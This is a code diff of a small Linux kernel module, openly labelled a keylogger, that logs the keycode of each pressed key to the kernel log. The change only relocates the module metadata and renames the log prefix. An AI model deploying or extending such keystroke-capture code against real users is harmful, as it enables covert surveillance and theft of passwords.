@@ -3,11 +3,15 @@
 #include <linux/notifier.h>
 #include <linux/keyboard.h>
 
+MODULE_AUTHOR("Nicholas Hubbard");
+MODULE_DESCRIPTION("A keylogger");
+MODULE_LICENSE("GPL");
+
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
   struct keyboard_notifier_param *param = data;
 
   if (action == KBD_KEYSYM && param->down) {
-    printk(KERN_INFO "Keylogger: keycode=%u\n", param->value);
+    printk(KERN_INFO "kloggg: keycode=%u\n", param->value);
   }
   
   return NOTIFY_OK;
@@ -30,7 +34,3 @@ static void __exit kloggg_exit(void) {
 
 module_init(kloggg_init);
 module_exit(kloggg_exit);
-
-MODULE_AUTHOR("Nicholas Hubbard");
-MODULE_DESCRIPTION("A keylogger");
-MODULE_LICENSE("GPL");
